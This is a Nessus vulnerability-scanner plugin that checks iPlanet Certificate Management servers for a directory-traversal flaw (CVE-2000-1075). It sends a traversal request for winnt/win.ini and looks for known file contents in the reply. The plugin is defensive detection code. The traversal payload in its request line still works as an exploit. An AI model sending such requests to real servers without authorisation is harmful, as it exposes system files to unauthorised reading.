#
# (C) Tenable Network Security, Inc.
#

#
# XXX might be redundant with plugin #10589
#


include("compat.inc");

if(description)
{
 script_id(10683);
 script_version ("$Revision: 1.16 $");
 script_cve_id("CVE-2000-1075");
 script_bugtraq_id(1839);
 script_xref(name:"OSVDB", value:"486");
 script_xref(name:"OSVDB", value:"4086");

 script_name(english:"iPlanet Certificate Management Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an information disclosure 
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It is possible to read arbitrary files on
the remote server by prepending /ca/\../\../
in front on the file name." );
 script_set_attribute(attribute:"see_also", value:"http://www1.corest.com/common/showdoc.php?idx=123&idxseccion=10" );
 script_set_attribute(attribute:"solution", value:
"The vendor has released a patch to fix the issue." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

script_end_attributes();

 
 summary["english"] = "\..\..\file.txt";
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 443);
 exit(0);
}

#
# The script code starts here
#

include("http.inc");
include("misc_func.inc");
include("global_settings.inc");

port = get_http_port(default:443);
if ( ! port ) exit(0);
banner = get_http_banner(port:port);
if ( "iPlanet" >!< banner ) exit(0);

res = http_send_recv3(method:"GET", item:string("/ca\\../\\../\\../\\../winnt/win.ini"), port:port);
if (isnull(res)) exit(1, "The remote web server did not respond.");
# ssl negot. is done by nessusd, transparently.

if (("[windows]" >< res[2]) ||
    ("[fonts]" >< res[2])){
  security_warning(port:port);
}
